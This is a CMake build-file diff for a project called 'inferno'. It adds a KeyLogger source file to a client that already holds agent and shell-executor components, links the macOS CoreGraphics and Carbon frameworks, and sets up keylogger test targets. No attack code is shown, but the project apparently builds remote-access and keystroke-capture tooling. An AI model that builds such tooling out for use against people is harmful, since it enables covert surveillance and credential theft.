@@ -35,8 +35,15 @@ add_executable(inferno_client
     client/src/Agent.cpp
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
+    client/src/KeyLogger.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
+
+if(APPLE)
+    find_library(CORE_GRAPHICS CoreGraphics)
+    find_library(CARBON Carbon)
+    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON})
+endif()
 
 # ==========================================
 # 5. TDD Infrastructure
@@ -48,9 +55,28 @@ add_executable(inferno_tests
     tests/server_test.cpp
     tests/packet_test.cpp
     tests/shell_test.cpp
+    tests/keylogger_test.cpp
     server/src/server.cpp
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
+    client/src/KeyLogger.cpp
 )
 target_link_libraries(inferno_tests PRIVATE inferno_common)
+target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
+
+if(APPLE)
+    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON})
+endif()
+
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
+
+# ==========================================
+# 6. Interactive / Manual Tests
+# ==========================================
+add_executable(inferno_keylogger_interactive
+    tests/keylogger_interactive_test.cpp
+    client/src/KeyLogger.cpp
+)
+if(APPLE)
+    target_link_libraries(inferno_keylogger_interactive PRIVATE ${CORE_GRAPHICS} ${CARBON})
+endif()
